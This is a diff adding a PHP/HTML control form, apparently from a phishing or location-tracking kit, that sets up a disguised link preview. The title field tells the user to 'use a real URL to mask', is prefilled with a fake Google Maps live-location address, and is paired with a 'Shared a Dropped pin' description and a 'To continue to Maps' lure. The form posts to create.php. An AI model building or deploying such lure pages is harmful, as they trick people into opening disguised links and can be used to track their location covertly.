@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<?php
+// Disable caching
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
+header("Pragma: no-cache");
+?></html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Change Code Form</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+    }
+    
+    .form-container {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: 0 auto;
+      margin-top: 50px;
+    }
+    
+    .form-container h2 {
+      margin-top: 0;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      background-color: #333;
+      color: #fff;
+    }
+    
+    .form-group input[type="submit"] {
+      background-color: #00bcd4;
+      color: #fff;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Change Code</h2>
+    <form action="create.php" method="post">
+      <div class="form-group">
+        <label for="title">7132132.php</label>
+        <input type="text" id="title" name="title" placeholder="Enter title [use a real URL to mask]" value="https://www.maps.google.ca/liveloca..." required>
+      </div>
+      <div class="form-group">
+        <label for="description">Description</label>
+        <input type="text" id="description" name="description" placeholder="Enter metadata description" value="Shared a Dropped pin showing current live location!">
+      </div>
+      <div class="form-group">
+        <label for="imagelink">Image Link</label>
+        <input type="text" id="imagelink" name="imagelink" placeholder="Enter a 200x200 meta preview image URL" value="https://i.ibb.co/X3w2Gy7/current.png" required>
+      </div>
+      <div class="form-group">
+        <label for="mod">Mod [BROKEN]</label>
+        <input type="text" id="mod" name="mod" placeholder="Enter 'To continue to Maps'" value="Current Location" required>
+      </div>
+      <div class="form-group">
+        <input type="submit" value="Submit">
+      </div>
+    </form>
+  </div>
+</body>
+</html>
